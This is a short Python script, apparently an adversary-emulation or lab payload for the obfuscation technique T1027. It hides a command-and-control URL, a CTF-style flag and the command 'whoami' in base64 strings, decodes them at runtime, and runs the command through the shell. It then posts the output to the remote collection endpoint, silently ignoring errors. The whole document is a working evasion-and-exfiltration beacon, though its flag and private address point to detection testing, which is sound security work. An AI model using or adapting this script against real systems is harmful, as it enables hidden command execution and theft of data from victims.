#!/usr/bin/env python3
# Obfuscated Python Payload - T1027 Defense Evasion

import base64
import requests
import subprocess
import platform

# Obfuscated components (base64 encoded)
obf_c2 = "aHR0cDovLzE5Mi4xNjguMTIyLjE6ODA4MC9jb2xsZWN0"  # C2 URL
obf_flag = "RkxBR3tUMTAyNy1iYXNlNjQtZW5jb2RlZH0="  # FLAG{T1027-base64-encoded}
obf_cmd = "d2hvYW1p"  # whoami

# Decode at runtime
c2_url = base64.b64decode(obf_c2).decode()
flag = base64.b64decode(obf_flag).decode()
cmd = base64.b64decode(obf_cmd).decode()

# Send flag
try:
    response = requests.post(f"{c2_url}", data=f"{flag}\nObfuscated execution detected", timeout=5)
    print(f"[+] Sent obfuscation flag")
except:
    pass

# Execute decoded command
try:
    result = subprocess.check_output(cmd, shell=True, text=True)
    requests.post(f"{c2_url}", data=f"{flag}\nCommand output: {result.strip()}", timeout=5)
except:
    pass

print("Obfuscated payload executed")
